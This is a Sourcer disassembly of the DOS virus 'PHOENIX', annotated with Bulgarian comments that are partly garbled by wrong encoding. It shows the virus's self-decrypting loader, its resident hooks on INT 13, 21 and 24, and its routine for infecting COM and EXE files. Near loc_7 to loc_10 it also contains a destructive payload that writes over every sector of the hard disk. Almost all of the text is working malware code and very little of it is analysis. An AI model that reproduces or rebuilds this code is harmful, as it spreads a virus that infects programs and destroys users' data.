Sourcer Listing v2.11      (GEMICHA)       !-!-!-  PHOENIX  -!-!-!



---------------------------------------------------------------------------------------------------------------

0000  95                                   xchg    ax,bp        ; запазване на AX
0001  BE 0100                              mov     si,100h      ; на╖ало▓о на за░азени┐ ┤айл
0004  46                                   inc     si           ; SI=101
0005  03 34                                add     si,[si]      ; SI= на╖ало▓о на ви░│▒а
0007  8B DE                                mov     bx,si        ; запазване в BX на╖ало▓о на ви░│▒а
0009  33 C9                                xor     cx,cx        ; CX= 0
000B  B8 0342                              mov     ax,342h      ; големина▓а на ви░│▒а -20h

000E  50                                   push    ax           ; AX -> Stack

000F  33 4C 22                             xor     cx,[si+22h]  ;\
0012  46                                   inc     si           ;  \
0013  46                                   inc     si           ;    нами░ане на кон▓░олна▓а
0014  48                                   dec     ax           ;    ▒│ма на ви░│▒а CRC
0015                       data_2          db      7Dh          ;  /
0015  7D F8                                jge     000Fh        ;/

0017  5A                                   pop     dx           ; Stack -> DX

0018  31 4F 22                             xor     [bx+22h],cx  ;\
001B  43                                   inc     bx           ;  \
001C  43                                   inc     bx           ;    ░азкоди░а╣а
001D  4A                                   dec     dx           ;    ╖а▒▓
001E                       data_3          db      7Dh          ;  /
001E  7D F8                                jge     0018h        ;/

0020  87 F6                                xchg    si,si        ;
0022  87 D1                                xchg    dx,cx        ; dx= CRC  cx= 0
0024  FA                                   cli                  ; заб░ана за п░ек║▒ване
0025  81 C6 F97C                           add     si,0F97Ch    ; SI= на╖ало▓о на ви░│▒а
0029  FC                                   cld                  ; Clear direction
002A  8B DC                                mov     bx,sp        ; BX= stack offset
002C  B1 04                                mov     cl,4
002E  D3 EB                                shr     bx,cl        ; BX= BX * 16d +1
0030  43                                   inc     bx           ; /
0031  8C D0                                mov     ax,ss        ; AX= stack seg
0033  03 D8                                add     bx,ax        ; BX= org addr stack

0035  BF 0004                              mov     di,4         ;
0038  8B 45 FE                             mov     ax,[di-2]    ; AX= seg last paragraph
003B  1E                                   push    ds           ; DS -> Stack
003C  8E DF                                mov     ds,di        ; DS= 0004h
003E  3B 45 66                             cmp     ax,[di+66h]  ; ▒о╖и ли INT 2A в по▒ледни┐ па░аг░а┤ ?
0041  74 16                                je      loc_3        ; ???
0043  80 EC 02                             sub     ah,2         ; AX= AX- 512d
0046  3B D8                                cmp     bx,ax        ; има ли п░епок░иване на stack ▒ last par.
0048  73 59                                jae     loc_6        ; Jump if above or =
004A  4F                                   dec     di           ;
004B  4F                                   dec     di           ; - di= 2
004C  AB                                   stosw                ; ax to es:[di] запи▒ва в PSP на ▒егмен▓а
004D  8C C3                                mov     bx,es        ; \
004F  4B                                   dec     bx           ;   ES= ES-1 ▒о╖и на╖ало▓о на ▓ек│╣и┐ блок
0050  8E C3                                mov     es,bx        ; /
0052  26: 80 2D 02                         sub     byte ptr es:[di],2 ;  намал┐ва блока ▒ 521d bytes
0056  89 45 66                             mov     [di+66h],ax  ; п░ом┐на на seg за INT 2A
0059                       loc_3:
0059  C7 45 64 0526                        mov     word ptr [di+64h],526h ; п░ом┐на на off за INT 2A
005E  4A                                   dec     dx           ; намал┐ CRC ▒ 1
005F  52                                   push    dx           ; запи▒ва ▒е в ▒▓ека
0060  50                                   push    ax           ; запи▒ на п░азни┐ ▒егмен▓
0061  C4 5D 08                             les     bx,dword ptr [di+8]    ; ES:BX = [ INT 13 ]
0064  B4 13                                mov     ah,13h       ; \
0066  CD 2F                                int     2Fh          ;
0068  06                                   push    es           ; запазване на
0069  53                                   push    bx           ; о░игинални┐
006A  B4 13                                mov     ah,13h       ;   INT 13
006C  CD 2F                                int     2Fh          ; /
006E  8C C2                                mov     dx,es        ; DX= ▓ек│╣и┐ 13
0070  5B                                   pop     bx           ; \
0071  07                                   pop     es           ; ES:BX [org INT 13]
0072  8C C0                                mov     ax,es
0074  3B C2                                cmp     ax,dx        ; ▓ек│╣и┐ о░игинален?
0076  1F                                   pop     ds           ; DS= п░азен ▒егмен▓
0077  9C                                   pushf                ; Push flags
0078  06                                   push    es           ;\
0079  53                                   push    bx           ; запазване на [org INT 13]
007A  1E                                   push    ds           ; запазване на п░азни┐ ▒егмен▓
007B  74 0D                                jz      loc_4        ; ▓ек│╣и┐ INT 13 org
007D  8C DA                                mov     dx,ds
007F  3B C2                                cmp     ax,dx
0081  72 5E                                jb      loc_7        ; Jump if below
0083  BA 059A                              mov     dx,59Ah
0086  B4 13                                mov     ah,13h
0088  CD 2F                                int     2Fh
008A                       loc_4:
008A  07                                   pop     es           ; п░азни┐ ▒егмен▓
008B  33 FF                                xor     di,di        ; DI= 0
008D  56                                   push    si           ; ви░│▒а на╖ало -> Stack
008E  B9 0355                              mov     cx,355h      ; 853d
0091  F3/ 2E: A5                           rep     movs word ptr es:[di],word ptr cs:[si]
                                                        ;п░е╡в║░л┐не на 853d бай▓а о▓ ви░│▒а на╖ало▓о?
0094  5E                                   pop     si           ; Stack -> ви░│▒а на╖ало
0095  B0 EA                                mov     al,0EAh
0097  AA                                   stosb                ; запи▒ва jmp в es:[di]
0098  B1 04                                mov     cl,4

009A                       locloop_5:
009A  58                                   pop     ax
009B  AB                                   stosw                           ; Store ax to es:[di]
009C  E2 FC                                loop    locloop_5               ; Loop if cx > 0

009E  B8 FE00                              mov     ax,0FE00h
00A1  AA                                   stosb                           ; Store al to es:[di]
00A2  AB                                   stosw                           ; Store ax to es:[di]
00A3                       loc_6:
00A3  07                                   pop     es
00A4  FB                                   sti                             ; Enable interrupts
00A5  0E                                   push    cs
00A6  1F                                   pop     ds
00A7  BF 00FE                              mov     di,0FEh
00AA  57                                   push    di
00AB  56                                   push    si
00AC  81 C6 00C8                           add     si,0C8h
00B0  A5                                   movsw                           ; Mov [si] to es:[di]
00B1  A5                                   movsw                           ; Mov [si] to es:[di]
00B2  A4                                   movsb                           ; Mov [si] to es:[di]
00B3  5F                                   pop     di
00B4  AD                                   lodsw                           ; String [si] to ax
00B5  FE C4                                inc     ah
00B7  96                                   xchg    ax,si
00B8  95                                   xchg    ax,bp
00B9  B9 0354                              mov     cx,354h
00BC  C3                                   retn

00BD                                       db      'PHOENIX',0

00C5  01 4C D0                             add     [si-30],cx
00C8  F3                                   repz
00C9  A5                                   movsw                           ; Mov [si] to es:[di]
00CA                       data_5          dw      34BCh
00CA  4D                                   dec     bp
00CB  5A                                   pop     dx
00CC  BA 47 08                             mov     dx,0847
00CF  E9 0F85                              jmp     18EBh
00D2  BF 004C                              mov     di,4Ch
00D5  8B 5D B6                             mov     bx,[di-4Ah]
00D8  33 D2                                xor     dx,dx                   ; Zero register
00DA  8E DA                                mov     ds,dx
00DC  3B 5D 5E                             cmp     bx,[di+5Eh]
00DF  74 52                                je      loc_11                  ; Jump if equal
00E1                       loc_7:
00E1  B2 80                                mov     dl,80h
00E3  B4 08                                mov     ah,8
00E5  CD 13                                int     13h                     ; Disk  dl=drive #: ah=func a8h
                                                                                ;  read parameters for drive dl
00E7  72 4A                                jc      loc_11                  ; Jump if carry Set
00E9  52                                   push    dx
00EA  B4 13                                mov     ah,13h
00EC  CD 2F                                int     2Fh                     ; Multiplex/Spooler al=func 00h
                                                                                ;  get installed status
00EE  FC                                   cld                             ; Clear direction
00EF  06                                   push    es
00F0  33 C0                                xor     ax,ax                   ; Zero register
00F2  8E C0                                mov     es,ax
00F4  E6 61                                out     61h,al                  ; port 61h, 8255 B - spkr, etc
                                                                                ;  al = 0, disable parity
00F6  93                                   xchg    ax,bx
00F7  AB                                   stosw                           ; Store ax to es:[di]
00F8  58                                   pop     ax
00F9  AB                                   stosw                           ; Store ax to es:[di]
00FA  8B C1                                mov     ax,cx
00FC  8A E9                                mov     ch,cl
00FE  B1 06                                mov     cl,6
0100  D2 ED                                shr     ch,cl                   ; Shift w/zeros fill
0102  8A CC                                mov     cl,ah
0104  24 3F                                and     al,3Fh                  ; '?'
0106  8B F1                                mov     si,cx
0108  5F                                   pop     di
0109  B2 80                                mov     dl,80h
010B                       loc_8:
010B  33 C9                                xor     cx,cx                   ; Zero register
010D                       loc_9:
010D  32 F6                                xor     dh,dh                   ; Zero register
010F  51                                   push    cx
0110  86 CD                                xchg    cl,ch
0112  D0 C9                                ror     cl,1                    ; Rotate
0114  D0 C9                                ror     cl,1                    ; Rotate
0116  41                                   inc     cx
0117                       loc_10:
0117  50                                   push    ax
0118  B4 03                                mov     ah,3
011A  CD 13                                int     13h                     ; Disk  dl=drive #: ah=func a3h
                                                                                ;  write sectors from mem es:bx
011C  FE C6                                inc     dh
011E  8B C7                                mov     ax,di
0120  3A F4                                cmp     dh,ah
0122  58                                   pop     ax
0123  76 F2                                jbe     loc_10                  ; Jump if below or =
0125  59                                   pop     cx
0126  41                                   inc     cx
0127  3B CE                                cmp     cx,si
0129  76 E2                                jbe     loc_9                   ; Jump if below or =
012B  42                                   inc     dx
012C  4F                                   dec     di
012D  F7 C7 00FF                           test    di,0FFh
0131  75 D8                                jnz     loc_8                   ; Jump if not zero
0133                       loc_11:
0133  8C C2                                mov     dx,es
0135  83 C2 10                             add     dx,10h
0138  E8 0008                              call    sub_1
013B  00 00                data_9          db      0, 0
013D  0000                 data_10         dw      0
013F  0000                 data_11         dw      0
0141  0000                 data_12         dw      0

                                ;==========================================================================
                                ;                              SUBROUTINE
                                ;==========================================================================

                                sub_1           proc    near
0143  5F                                   pop     di
0144  0E                                   push    cs
0145  1F                                   pop     ds
0146  01 55 02                             add     [di+2],dx
0149  03 55 04                             add     dx,[di+4]
014C  8E D2                                mov     ss,dx
014E  8B 65 06                             mov     sp,[di+6]
0151  06                                   push    es
0152  1F                                   pop     ds
0153  2E: FF 2D                            jmp     dword ptr cs:[di]

                                ;==========================================================================
                                ;                              SUBROUTINE
                                ;               INT     21
                                ;==========================================================================


0156  9C                                   pushf                           ; Push flags
0157  FA                                   cli                             ; Disable interrupts
0158  50                                   push    ax
0159  53                                   push    bx
015A  51                                   push    cx
015B  52                                   push    dx
015C  56                                   push    si
015D  57                                   push    di
015E  1E                                   push    ds
015F  06                                   push    es
0160  FC                                   cld                             ; Clear direction
0161  0E                                   push    cs
0162  07                                   pop     es
0163  33 C9                                xor     cx,cx
0165  80 FC 3E                             cmp     ah,3Eh
0168  74 15                                je      loc_12

016A  8B F2                                mov     si,dx
016C  BF 06BA                              mov     di,6BAh                 ; Име на ┤айла
016F  B1 28                                mov     cl,28h                  ; Мак▒имална големина на ┤айла
0171  F3/ A5                               rep     movsw                   ; cx >0 Mov [si] to es:[di]
0173  93                                   xchg    ax,bx                   ; запазване на ┤│нк╢и┐▓а
0174  B8 3D00                              mov     ax,3D00h
0177  CD 21                                int     21h                     ; DOS Services  ah=function 3Dh
                                                                                ;  open file, al=mode,name@ds:dx
0179  93                                   xchg    ax,bx                   ; в░║╣ане номе░а на ┤│нк╢и┐▓а
017A  73 03                                jnc     loc_12                  ; Ако н┐ма г░е╕ка -->
017C  BB FFFF                              mov     bx,0FFFFh               ; Ако н┐ма г░е╕ка ФМ = FFFF
017F                       loc_12:
017F  91                                   xchg    ax,cx                   ; запазва в CX ┤│нк╢и┐▓а
0180  8E D8                                mov     ds,ax                   ; DS= 0
0182  BF 06A6                              mov     di,6A6h                 ; DW  INT 13
0185  BE 004C                              mov     si,4Ch
0188  B8 0690                              mov     ax,690h                 ; Vir  INT 13
018B  87 04                                xchg    ax,[si]                 ; Read Int 13 ofs
018D  AB                                   stosw                           ; Store ax to CS:[6A6]
018E  50                                   push    ax                      ; Int13 Ofs -> Stack
018F  8C C0                                mov     ax,es
0191  87 44 02                             xchg    ax,[si+2]               ; Read Int 13 seg
0194  AB                                   stosw                           ; Store ax to es:[di]
0195  50                                   push    ax                      ; Int13 Seg -> Stack

0196  B8 0597                              mov     ax,597h                 ; Vir INT 24
0199  87 44 44                             xchg    ax,[si+44h]
019C  50                                   push    ax                      ; INT24 Ofs -> Stack
019D  8C C0                                mov     ax,es
019F  87 44 46                             xchg    ax,[si+46h]
01A2  50                                   push    ax                      ; INT24 Seg -> Stack
01A3  1E                                   push    ds                      ; 0   -> Stack
01A4  56                                   push    si                      ; 4C  -> Stack
01A5  32 D2                                xor     dl,dl
01A7  B8 3302                              mov     ax,3302h                ; DOS Services  ah=function 33h
01AA  CD 21                                int     21h                     ;  ctrl-break flag al=off/on
01AC  52                                   push    dx
01AD  E8 02F3                              call    sub_2
01B0  72 16                                jc      loc_13                  ; Jump if carry Set
01B2  A1 046C                              mov     ax,word ptr ds:[46Ch]   ; (0000:046C=8335h)
01B5  26: C5 75 07                         lds     si,dword ptr es:[di+7]  ; Load 32 bit ptr
01B9  80 7C 08 02                          cmp     byte ptr [si+8],2
01BD  06                                   push    es
01BE  1F                                   pop     ds
01BF  8B 75 11                             mov     si,[di+11h]
01C2  96                                   xchg    ax,si
01C3  BA 0403                              mov     dx,403h
01C6  B1 80                                mov     cl,80h
01C8                       loc_13:
01C8  72 7C                                jc      loc_22                  ; Jump if carry Set
01CA  2D 07A8                              sub     ax,7A8h
01CD  87 45 15                             xchg    ax,[di+15h]
01D0  50                                   push    ax
01D1  72 03                                jc      loc_14                  ; Jump if carry Set
01D3  84 75 04                             test    dh,[di+4]
01D6                       loc_14:
01D6  75 7E                                jnz     loc_24                  ; Jump if not zero
01D8  80 FD 3E                             cmp     ch,3Eh                  ; '>'
01DB  75 05                                jne     loc_15                  ; Jump if not equal
01DD  BA 0002                              mov     dx,2
01E0  B1 C0                                mov     cl,0C0h
01E2                       loc_15:
01E2  22 4D 05                             and     cl,[di+5]
01E5  75 6F                                jnz     loc_24                  ; Jump if not zero
01E7  2E: 89 16 06B6                       mov     word ptr cs:[6B6h],dx   ; (06B6=403h)
01EC  83 7D 13 00                          cmp     word ptr [di+13h],0
01F0  75 64                                jne     loc_24                  ; Jump if not equal
01F2  8B 45 28                             mov     ax,[di+28h]
01F5  3D 5845                              cmp     ax,5845h
01F8  74 13                                je      loc_16                  ; Jump if equal
01FA  3D 4F43                              cmp     ax,4F43h
01FD  75 13                                jne     loc_17                  ; Jump if not equal
01FF  3B 45 20                             cmp     ax,[di+20h]
0202  B8 4D4D                              mov     ax,4D4Dh
0205  75 06                                jnz     loc_16                  ; Jump if not zero
0207  3B 45 22                             cmp     ax,[di+22h]
020A  75 01                                jne     loc_16                  ; Jump if not equal
020C  41                                   inc     cx
020D                       loc_16:
020D  3A 45 2A                             cmp     al,[di+2Ah]
0210  74 05                                je      loc_18                  ; Jump if equal
0212                       loc_17:
0212  80 FD 4B                             cmp     ch,4Bh                  ; 'K'
0215  75 3F                                jne     loc_24                  ; Jump if not equal
0217                       loc_18:
0217  51                                   push    cx
0218  FF 75 15                             push    word ptr [di+15h]
021B  0E                                   push    cs
021C  1F                                   pop     ds
021D  B9 0002                              mov     cx,2
0220  B4 3F                                mov     ah,3Fh                  ; '?'
0222  E8 02A5                              call    sub_6
0225  72 13                                jc      loc_21                  ; Jump if carry Set
0227  A1 070A                              mov     ax,word ptr ds:[70Ah]   ; (070A=0BF95h)
022A  0A C4                                or      al,ah
022C  75 05                                jnz     loc_19                  ; Jump if not zero
022E  E8 0294                              call    sub_4
0231  72 07                                jc      loc_21                  ; Jump if carry Set
0233                       loc_19:
0233  87 F2                                xchg    si,dx

0235                       locloop_20:
0235  AC                                   lodsb                           ; String [si] to al
0236  84 C0                                test    al,al
0238  E1 FB                                loopz   locloop_20              ; Loop if zf=1, cx>0
023A                       loc_21:
023A  58                                   pop     ax
023B  59                                   pop     cx
023C  06                                   push    es
023D  1F                                   pop     ds
023E  72 16                                jc      loc_24                  ; Jump if carry Set
0240  75 07                                jnz     loc_23                  ; Jump if not zero
0242  41                                   inc     cx
0243  92                                   xchg    ax,dx
0244  EB 5F                                jmp     short loc_29
0246                       loc_22:
0246  E9 0154                              jmp     loc_37
0249                       loc_23:
0249  84 C9                                test    cl,cl
024B  75 09                                jnz     loc_24                  ; Jump if not zero
024D  8A 45 12                             mov     al,[di+12h]
0250  F6 D0                                not     al
0252  A8 38                                test    al,38h                  ; '8'
0254  75 3D                                jnz     loc_28                  ; Jump if not zero
0256                       loc_24:
0256  8F 45 15                             pop     word ptr [di+15h]
0259  80 FD 4B                             cmp     ch,4Bh                  ; 'K'
025C  75 E8                                jne     loc_22                  ; Jump if not equal
025E  B4 3E                                mov     ah,3Eh                  ; '>'
0260  CD 21                                int     21h                     ; DOS Services  ah=function 3Eh
                                                                                ;  close file, bx=file handle
0262  0E                                   push    cs
0263  1F                                   pop     ds
0264  0E                                   push    cs
0265  07                                   pop     es
0266  BE 06BA                              mov     si,6BAh
0269  8B FE                                mov     di,si
026B  B4 60                                mov     ah,60h                  ; '`'
026D  CD 21                                int     21h                     ; DOS Services  ah=function 60h
026F  72 1F                                jc      loc_27                  ; Jump if carry Set
0271  84 C0                                test    al,al
0273  75 1B                                jnz     loc_27                  ; Jump if not zero
0275                       loc_25:
0275  AC                                   lodsb                           ; String [si] to al
0276  3C 5C                                cmp     al,5Ch                  ; '\'
0278  75 02                                jne     loc_26                  ; Jump if not equal
027A  8B FE                                mov     di,si
027C                       loc_26:
027C  84 C0                                test    al,al
027E  75 F5                                jnz     loc_25                  ; Jump if not zero
0280  57                                   push    di
0281  B8 2E2A                              mov     ax,2E2Ah
0284  AB                                   stosw                           ; Store ax to es:[di]
0285  A1 01F6                              mov     ax,word ptr ds:[1F6h]   ; (01F6=5845h)
0288  AB                                   stosw                           ; Store ax to es:[di]
0289  32 E4                                xor     ah,ah                   ; Zero register
028B  AB                                   stosw                           ; Store ax to es:[di]
028C  5F                                   pop     di
028D  E9 0132                              jmp     loc_39
0290                       loc_27:
0290  E9 010E                              jmp     loc_38
0293                       loc_28:
0293  33 C0                                xor     ax,ax                   ; Zero register
0295  92                                   xchg    ax,dx
0296  86 C4                                xchg    al,ah
0298  50                                   push    ax
0299  8B 75 11                             mov     si,[di+11h]
029C  83 EE 03                             sub     si,3
029F  F7 F6                                div     si                      ; ax,dx rem=dx:ax/reg
02A1  83 C2 03                             add     dx,3
02A4  58                                   pop     ax
02A5                       loc_29:
02A5  FF 75 05                             push    word ptr [di+5]
02A8  51                                   push    cx
02A9  52                                   push    dx
02AA  53                                   push    bx
02AB  33 D2                                xor     dx,dx                   ; Zero register
02AD  89 55 15                             mov     [di+15h],dx
02B0  0E                                   push    cs
02B1  1F                                   pop     ds
02B2  B9 0090                              mov     cx,90h
02B5  F7 F1                                div     cx                      ; ax,dx rem=dx:ax/reg
02B7  E8 0236                              call    sub_9
02BA  A2 0015                              mov     data_2,al               ; (0015=7Dh)
02BD  E8 0230                              call    sub_9
02C0  A2 001E                              mov     data_3,al               ; (001E=7Dh)
02C3  92                                   xchg    ax,dx
02C4  B2 06                                mov     dl,6
02C6  F6 F2                                div     dl                      ; al, ah rem = ax/reg
02C8  BE 070A                              mov     si,70Ah
02CB  BB 051D                              mov     bx,51Dh
02CE  E8 0201                              call    sub_8
02D1  88 04                                mov     [si],al
02D3  46                                   inc     si
02D4  BB 0520                              mov     bx,520h
02D7  E8 01F6                              call    sub_7
02DA  BB 0523                              mov     bx,523h
02DD  E8 01F0                              call    sub_7
02E0  BB 0709                              mov     bx,709h
02E3  BE 04F9                              mov     si,4F9h
02E6  B9 0024                              mov     cx,24h

02E9                       locloop_30:
02E9  AC                                   lodsb                           ; String [si] to al
02EA  84 C0                                test    al,al
02EC  74 1F                                jz      loc_32                  ; Jump if zero
02EE  50                                   push    ax
02EF  24 07                                and     al,7
02F1  D7                                   xlat [bx]                       ; al=[al+[bx]] table
02F2  B4 F8                                mov     ah,0F8h
02F4  92                                   xchg    ax,dx
02F5  58                                   pop     ax
02F6  51                                   push    cx
02F7  B1 03                                mov     cl,3
02F9  D2 E8                                shr     al,cl                   ; Shift w/zeros fill
02FB  74 07                                jz      loc_31                  ; Jump if zero
02FD  D7                                   xlat [bx]                       ; al=[al+[bx]] table
02FE  D2 E0                                shl     al,cl                   ; Shift w/zeros fill
0300  0A D0                                or      dl,al
0302  B6 C0                                mov     dh,0C0h
0304                       loc_31:
0304  59                                   pop     cx
0305  20 B4 FB06                           and     byte ptr ds:[0FB06h][si],dh     ; (FB06=0FFh)
0309  08 94 FB06                           or      byte ptr ds:[0FB06h][si],dl     ; (FB06=0FFh)
030D                       loc_32:
030D  E2 DA                                loop    locloop_30              ; Loop if cx > 0

030F  5B                                   pop     bx
0310  BA 00CA                              mov     dx,0CAh
0313  B1 03                                mov     cl,3
0315  B4 3F                                mov     ah,3Fh                  ; '?'
0317  CD 21                                int     21h                     ; DOS Services  ah=function 3Fh
                                                                                ;  read file, cx=bytes, to ds:dx
0319  58                                   pop     ax
031A  59                                   pop     cx
031B  72 73                                jc      loc_36                  ; Jump if carry Set
031D  26: 89 45 15                         mov     es:[di+15h],ax
0321  2D 0003                              sub     ax,3
0324  A3 00D0                              mov     word ptr ds:[0D0h],ax   ; (00D0=0F85h)
0327  A1 00CA                              mov     ax,data_5               ; (00CA=34BCh)
032A  E8 018F                              call    sub_3
032D  74 61                                jz      loc_36                  ; Jump if zero
032F  84 C9                                test    cl,cl
0331  75 25                                jnz     loc_33                  ; Jump if not zero
0333  E8 018F                              call    sub_4
0336  72 58                                jc      loc_36                  ; Jump if carry Set
0338  91                                   xchg    ax,cx
0339  26: 03 45 11                         add     ax,es:[di+11h]
033D  2B C1                                sub     ax,cx
033F  26: 89 45 15                         mov     es:[di+15h],ax
0343  A3 00CD                              mov     word ptr ds:[0CDh],ax   ; (00CD=1630h)
0346  B4 40                                mov     ah,40h                  ; '@'
0348  CD 21                                int     21h                     ; DOS Services  ah=function 40h
                                                                                ;  write file cx=bytes, to ds:dx
034A  3B C1                                cmp     ax,cx
034C  75 42                                jne     loc_36                  ; Jump if not equal
034E  A1 00D0                              mov     ax,word ptr ds:[0D0h]   ; (00D0=0F85h)
0351  05 0003                              add     ax,3
0354  26: 89 45 15                         mov     es:[di+15h],ax
0358                       loc_33:
0358  33 D2                                xor     dx,dx                   ; Zero register
035A  8B F2                                mov     si,dx
035C  B9 0353                              mov     cx,353h

035F                       locloop_34:
035F  AD                                   lodsw                           ; String [si] to ax
0360  81 FE 0022                           cmp     si,22h
                                                nop                             ; Fixup for MASM (M)
0364  72 06                                jb      loc_35                  ; Jump if below
0366  33 06 06B1                           xor     ax,word ptr ds:[6B1h]   ; (06B1=0FFF0h)
036A  33 D0                                xor     dx,ax
036C                       loc_35:
036C  89 84 0708                           mov     word ptr ds:[708h][si],ax       ; (0708=0)
0370  E2 ED                                loop    locloop_34              ; Loop if cx > 0

0372  33 16 06B1                           xor     dx,word ptr ds:[6B1h]   ; (06B1=0FFF0h)
0376  31 94 012A                           xor     word ptr ds:[12Ah][si],dx       ; (012A=42E2h)
037A  B4 40                                mov     ah,40h                  ; '@'
037C  E8 0148                              call    sub_5
037F  33 C8                                xor     cx,ax
0381  75 0D                                jnz     loc_36                  ; Jump if not zero
0383  26: 89 4D 15                         mov     es:[di+15h],cx
0387  BA 00CF                              mov     dx,0CFh
038A  B1 03                                mov     cl,3
038C  B4 40                                mov     ah,40h                  ; '@'
038E  CD 21                                int     21h                     ; DOS Services  ah=function 40h
                                                                                ;  write file cx=bytes, to ds:dx
0390                       loc_36:
0390  58                                   pop     ax
0391  0A C4                                or      al,ah
0393  24 40                                and     al,40h                  ; '@'
0395  26: 08 45 06                         or      es:[di+6],al
0399  26: 8F 45 15                         pop     word ptr es:[di+15h]
039D                       loc_37:
039D  B4 3E                                mov     ah,3Eh                  ; '>'
039F  CD 21                                int     21h                     ; DOS Services  ah=function 3Eh
                                                                                ;  close file, bx=file handle
03A1                       loc_38:
03A1  5A                                   pop     dx
03A2  B8 3301                              mov     ax,3301h
03A5  CD 21                                int     21h                     ; DOS Services  ah=function 33h
                                                                                ;  ctrl-break flag al=off/on
03A7  5E                                   pop     si
03A8  1F                                   pop     ds
03A9  8F 44 46                             pop     word ptr [si+46h]
03AC  8F 44 44                             pop     word ptr [si+44h]
03AF  8F 44 02                             pop     word ptr [si+2]
03B2  8F 04                                pop     word ptr [si]
03B4  07                                   pop     es
03B5  1F                                   pop     ds
03B6  5F                                   pop     di
03B7  5E                                   pop     si
03B8  5A                                   pop     dx
03B9  59                                   pop     cx
03BA  5B                                   pop     bx
03BB  58                                   pop     ax
03BC  9D                                   popf                            ; Pop flags
03BD  EA 0BCD:20B4                         jmp     far ptr loc_2
03C2                       loc_39:
03C2  B4 2F                                mov     ah,2Fh                  ; '/'
03C4  CD 21                                int     21h                     ; DOS Services  ah=function 2Fh
                                                                                ;  get DTA ptr into es:bx
03C6  06                                   push    es
03C7  53                                   push    bx
03C8  BA 070A                              mov     dx,70Ah
03CB  B4 1A                                mov     ah,1Ah
03CD  CD 21                                int     21h                     ; DOS Services  ah=function 1Ah
                                                                                ;  set DTA to ds:dx
03CF  B9 0006                              mov     cx,6
03D2  BA 06BA                              mov     dx,6BAh
03D5  B4 4E                                mov     ah,4Eh                  ; 'N'
03D7  CD 21                                int     21h                     ; DOS Services  ah=function 4Eh
                                                                                ;  find 1st filenam match @ds:dx
03D9  72 10                                jc      loc_41                  ; Jump if carry Set
03DB                       loc_40:
03DB  A0 0720                              mov     al,byte ptr ds:[720h]   ; (0720=0F8h)
03DE  24 1F                                and     al,1Fh
03E0  3C 1E                                cmp     al,1Eh
03E2  F8                                   clc                             ; Clear carry flag
03E3  75 06                                jnz     loc_41                  ; Jump if not zero
03E5  B4 4F                                mov     ah,4Fh                  ; 'O'
03E7  CD 21                                int     21h                     ; DOS Services  ah=function 4Fh
                                                                                ;  find next filename match
03E9  73 F0                                jnc     loc_40                  ; Jump if carry=0
03EB                       loc_41:
03EB  5A                                   pop     dx
03EC  1F                                   pop     ds
03ED  9C                                   pushf                           ; Push flags
03EE  B4 1A                                mov     ah,1Ah
03F0  CD 21                                int     21h                     ; DOS Services  ah=function 1Ah
                                                                                ;  set DTA to ds:dx
03F2  9D                                   popf                            ; Pop flags
03F3  72 AC                                jc      loc_38                  ; Jump if carry Set
03F5  0E                                   push    cs
03F6  1F                                   pop     ds
03F7  0E                                   push    cs
03F8  07                                   pop     es
03F9  BE 0728                              mov     si,728h
03FC  41                                   inc     cx
03FD  F3/ A5                               rep     movsw                   ; Rep when cx >0 Mov [si] to es:[di]
03FF  BA 06BA                              mov     dx,6BAh
0402  B8 3D00                              mov     ax,3D00h
0405  CD 21                                int     21h                     ; DOS Services  ah=function 3Dh
                                                                                ;  open file, al=mode,name@ds:dx
0407  72 98                                jc      loc_38                  ; Jump if carry Set
0409  93                                   xchg    ax,bx
040A  E8 0096                              call    sub_2
040D  72 8E                                jc      loc_37                  ; Jump if carry Set
040F  83 C7 15                             add     di,15h
0412  B1 18                                mov     cl,18h
0414  B4 3F                                mov     ah,3Fh                  ; '?'
0416  CD 21                                int     21h                     ; DOS Services  ah=function 3Fh
                                                                                ;  read file, cx=bytes, to ds:dx
0418  3B C1                                cmp     ax,cx
041A                       loc_42:
041A  75 81                                jne     loc_37                  ; Jump if not equal
041C  8B F2                                mov     si,dx
041E  AD                                   lodsw                           ; String [si] to ax
041F  E8 009A                              call    sub_3
0422  75 F6                                jnz     loc_42                  ; Jump if not zero
0424  26: 80 4D F8 1F                      or      byte ptr es:[di-8],1Fh
0429  26: FE 4D F8                         dec     byte ptr es:[di-8]
042D  B1 02                                mov     cl,2

042F                       locloop_43:
042F  92                                   xchg    ax,dx
0430  26: 8B 45 FC                         mov     ax,es:[di-4]
0434  AB                                   stosw                           ; Store ax to es:[di]
0435  E2 F8                                loop    locloop_43              ; Loop if cx > 0
0437  83 7C 0A FF                          cmp     word ptr [si+0Ah],0FFFFh
043B  75 59                                jne     loc_45                  ; Jump if not equal
043D  B1 0C                                mov     cl,0Ch
043F  D3 E0                                shl     ax,cl                   ; Shift w/zeros fill
0441  2B 44 06                             sub     ax,[si+6]
0444  87 54 12                             xchg    dx,[si+12h]
0447  87 44 14                             xchg    ax,[si+14h]
044A  89 16 013B                           mov     word ptr data_9,dx      ; (013B=0)
044E  A3 013D                              mov     data_10,ax              ; (013D=0)
0451  B8 FFF0                              mov     ax,0FFF0h
0454  87 44 0C                             xchg    ax,[si+0Ch]
0457  A3 013F                              mov     data_11,ax              ; (013F=0)
045A  B8 0100                              mov     ax,100h
045D  87 44 0E                             xchg    ax,[si+0Eh]
0460  A3 0141                              mov     data_12,ax              ; (0141=0)
0463  BA 00D2                              mov     dx,0D2h
0466  B1 84                                mov     cl,84h
0468  B4 40                                mov     ah,40h                  ; '@'
046A  CD 21                                int     21h                     ; DOS Services  ah=function 40h
                                                                                ;  write file cx=bytes, to ds:dx
046C  C133                 data_15         dw      0C133h
046E  75 26                                jnz     loc_45                  ; Jump if not zero
0470  83 EF 04                             sub     di,4
0473  AB                                   stosw                           ; Store ax to es:[di]
0474  AB                                   stosw                           ; Store ax to es:[di]
0475  26: 8B 45 F8                         mov     ax,es:[di-8]
0479  26: 8B 55 FA                         mov     dx,es:[di-6]
047D  B9 0200                              mov     cx,200h
0480  F7 F1                                div     cx                      ; ax,dx rem=dx:ax/reg
0482  85 D2                                test    dx,dx
0484  74 01                                jz      loc_44                  ; Jump if zero
0486  40                                   inc     ax
0487                       loc_44:
0487  89 14                                mov     [si],dx
0489  89 44 02                             mov     [si+2],ax
048C  B9 0018                              mov     cx,18h
048F  BA 06BA                              mov     dx,6BAh
0492  B4 40                                mov     ah,40h                  ; '@'
0494  CD 21                                int     21h                     ; DOS Services  ah=function 40h
                                                                                ;  write file cx=bytes, to ds:dx
0496                       loc_45:
0496  26: 80 65 EC BF                      and     byte ptr es:[di-14h],0BFh
049B  26: 80 4D ED 40                      or      byte ptr es:[di-13h],40h        ; '@'
04A0  E9 FEFA                              jmp     loc_37
                                sub_1           endp


                                ;==========================================================================
                                ;                              SUBROUTINE
                                ;==========================================================================

